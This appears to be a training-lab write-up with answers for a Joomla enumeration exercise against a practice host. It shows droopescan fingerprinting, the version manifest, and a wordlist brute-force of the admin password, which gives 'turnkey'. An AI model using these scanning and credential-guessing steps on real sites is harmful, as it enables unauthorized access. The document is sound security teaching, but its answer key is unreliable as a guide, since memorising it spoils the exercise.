# Section 05: Joomla - Discovery & Emuneration

Module: 24. Attacking Common Applications

---

## Questions & Answers

### 1. Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x)

Context:
- Run the automated scan
```bash
┌─[eu-academy-2]─[10.10.14.46]─[htb-ac-2162140@htb-3zjlds7dty-htb-cloud-com]─[~]
└──╼ [★]$ droopescan scan joomla --url http://app.inlanefreight.local/
[+] Possible version(s):                                                        
    3.10.0-alpha1

[+] Possible interesting urls found:
    Detailed version information. - http://app.inlanefreight.local/administrator/manifests/files/joomla.xml
    Login page. - http://app.inlanefreight.local/administrator/
    License file. - http://app.inlanefreight.local/LICENSE.txt
    Version attribute contains approx version - http://app.inlanefreight.local/plugins/system/cache/cache.xml

[+] Scan finished (0:00:08.147988 elapsed)
```
- Check the `/administrator/manifests/files/joomla.xml` got the version:
```xml
<extension version="3.6" type="file" method="upgrade">
<name>files_joomla</name>
<author>Joomla! Project</author>
<authorEmail>admin@joomla.org</authorEmail>
<authorUrl>www.joomla.org</authorUrl>
<copyright>(C) 2019 Open Source Matters, Inc.</copyright>
<license>
GNU General Public License version 2 or later; see LICENSE.txt
</license>
<version>3.10.0</version>
<creationDate>August 2021</creationDate>
<description>FILES_JOOMLA_XML_DESCRIPTION</description>
<scriptfile>administrator/components/com_admin/script.php</scriptfile>
<update>
<schemas>
<schemapath type="mysql">
administrator/components/com_admin/sql/updates/mysql
</schemapath>
<schemapath type="sqlsrv">
administrator/components/com_admin/sql/updates/sqlazure
</schemapath>
<schemapath type="sqlazure">
administrator/components/com_admin/sql/updates/sqlazure
</schemapath>
<schemapath type="postgresql">
administrator/components/com_admin/sql/updates/postgresql
</schemapath>
</schemas>
</update>
<fileset>
<files>
<folder>administrator</folder>
<folder>bin</folder>
<folder>cache</folder>
<folder>cli</folder>
<folder>components</folder>
<folder>images</folder>
<folder>includes</folder>
<folder>language</folder>
<folder>layouts</folder>
<folder>libraries</folder>
<folder>media</folder>
<folder>modules</folder>
<folder>plugins</folder>
<folder>templates</folder>
<folder>tmp</folder>
<file>htaccess.txt</file>
<file>web.config.txt</file>
<file>LICENSE.txt</file>
<file>README.txt</file>
<file>index.php</file>
</files>
</fileset>
<updateservers>
<server name="Joomla! Core" type="collection">https://update.joomla.org/core/list.xml</server>
</updateservers>
</extension>
```

**Answer:** `3.10.0`

---

### 2. Find the password for the admin user on http://app.inlanefreight.local

Context:
- Brute-force the password of `admin`:
```bash
┌─[eu-academy-2]─[10.10.14.46]─[htb-ac-2162140@htb-3zjlds7dty-htb-cloud-com]─[~]
└──╼ [★]$ sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 admin:turnkey
```

**Answer:** `turnkey`

---

[Back to Module Index](./README.md)
